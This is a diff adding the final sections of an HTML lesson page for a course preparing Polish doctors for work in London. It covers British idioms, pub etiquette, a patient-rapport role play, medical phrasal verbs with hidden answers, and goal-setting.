+                            <td>6. "It's all gone <strong>pear-shaped</strong>."</td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">It has all gone wrong / failed terribly.</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- 11. PUB CULTURE -->
+    <section class="section" id="pub">
+        <div class="section-inner">
+            <span class="section-label">Task 11</span>
+            <h2 class="section-title">Pub Culture &amp; Socializing 🍻</h2>
+            <div class="card">
+                <p>After a tough week, the team often goes to the pub. Understanding the rules is key to team bonding.</p>
+                <ul style="margin-left: 20px; margin-bottom: 20px;">
+                    <li><strong>"Rounds":</strong> One person buys drinks for the whole group. Then the next person buys the next round. You must buy a round if someone bought you a drink!</li>
+                    <li><strong>"Going Dutch":</strong> Splitting the bill exactly in half (usually at restaurants, not pubs).</li>
+                </ul>
+                <p><strong>Discussion:</strong> Are you a pub person? How will you handle socializing with the team if you are tired after a 12-hour shift?</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 12. ROLE PLAY PATIENT -->
+    <section class="section" id="roleplay2">
+        <div class="section-inner">
+            <span class="section-label">Tasks 12 &amp; 13</span>
+            <h2 class="section-title">Role Play: The Nervous Patient 🩺</h2>
+            
+            <div class="prompt-list">
+                <div class="prompt-item">
+                    <strong>Task 12: Building Rapport</strong>
+                    <p><strong>Scenario:</strong> You are about to perform a transvaginal ultrasound on a patient who has suffered a previous miscarriage. She is crying and shaking. <br><br>
+                    <em>Practice making 2 minutes of gentle, empathetic small talk to calm her down before asking her to undress. Do not talk about the baby yet.</em></p>
+                </div>
+                <div class="prompt-item">
+                    <strong>Task 13: Emergency Phrasals (Quick Fire)</strong>
+                    <p><em>Translate these actions into phrasal verbs quickly:</em></p>
+                    <ul style="margin-left: 20px;">
+                        <li>"Summon the consultant from home" → <span class="spoiler" onclick="toggleSpoiler(this)">Call in</span></li>
+                        <li>"Wash hands for surgery" → <span class="spoiler" onclick="toggleSpoiler(this)">Scrub up</span></li>
+                        <li>"Lose all blood volume" → <span class="spoiler" onclick="toggleSpoiler(this)">Bleed out</span></li>
+                        <li>"Eliminate a diagnosis" → <span class="spoiler" onclick="toggleSpoiler(this)">Rule out</span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 14. CULTURE SHOCK -->
+    <section class="section" id="culture">
+        <div class="section-inner">
+            <span class="section-label">Task 14</span>
+            <h2 class="section-title">Culture Shock Expectations 🌍</h2>
+            <div class="card">
+                <p><strong>Discussion:</strong> Based on everything we have studied (from flattened hierarchy to extreme politeness, from the legal documentation to the fast-paced handover), what do you think will be the biggest "Culture Shock" for you next week compared to working in Poland?</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 15. FINAL ADVICE -->
+    <section class="section" id="final">
+        <div class="section-inner">
+            <span class="section-label">Task 15</span>
+            <h2 class="section-title">The Final Advice 🎯</h2>
+            <div class="card" style="text-align: center; border-color: var(--gold);">
+                <h3 style="color: var(--teal); font-size: 1.5rem; margin-bottom: 20px;">Setting Your Goal</h3>
+                <p>Set <strong>one specific professional goal</strong> and <strong>one specific personal goal</strong> for your first 7 days in London.</p>
+                <div style="margin-top: 20px;">
+                    <p>Professional: <span class="gap" style="width: 60%;"></span></p>
+                    <p>Personal: <span class="gap" style="width: 60%;"></span></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+</div>
+
+<button onclick="saveDocument()" class="save-btn" title="Save your notes">💾 Save Lesson</button>
+
+<footer class="footer">
+    <p>Prepared for Academic &amp; Clinical Use</p>
+    <p><strong>The London Registrar Course</strong></p>
+    <p style="margin-top: 10px; color: var(--gold); font-weight: bold;">Good luck in London!</p>
+</footer>
+
+
+
+<div id="mackeeper-extension" data-v-app=""><div><!--teleport start--><!--teleport end--></div></div></body></html>
